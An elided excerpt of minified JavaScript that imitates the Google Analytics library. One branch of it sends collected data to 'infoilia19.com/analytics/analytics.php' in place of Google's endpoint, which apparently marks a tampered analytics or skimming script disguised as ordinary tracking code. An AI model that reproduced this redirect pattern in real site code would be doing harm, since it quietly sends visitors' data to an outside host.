(function() {
        ...
        function b(k) {
            for (; d < a.length;) {
                var n = a.charAt(d++),
                    p = J[n];
                if (null != p) return p;
                if (!/^[\s\xa0]*$/.test(n)) throw Error("Unknown base64 encoding to char: " + n);
            }
            return k
        }
        H = H || I();
    ...
    function S(a, b) {
        ...
        if (!(b = L)) {
            b = Array(256);
            for (var c = 0; 256 > c; c++) {
                for (var d = c, e = 0; 8 > e; e++) d = d & 1 ? d >>> 1 ^ 2468101213 : d >>> 1;
                b[c] = d
            }
        }
        L = b;
...
(function() {
    ...
    var bd = function(a) { return (a ? "https:" : Ba || "https:" == M.location.protocol ? "https:" : "http:") + "//www.google-analytics.com" },
        ...
        oc = function(a, b, c) {
            if (0 === b.length) c();
                ...
                switch (d) {
                    case "d":
                        pe("https://www.infoilia19.com/analytics/analytics.php",
                            a.U, a, c);
                        break;
                    case "g":
    ...
    function Sa(a) {
        ...
        var c = P(a, gd),
            d = P(a, oe),
            e = c || (d || bd(!1) + "") + "/analytics.php";
        switch (P(a, ad)) {
            case "d":
                e = c || (d || bd(!1) + "") + "/analytics/analytics.php";
                b = a.get(qe) || void 0;
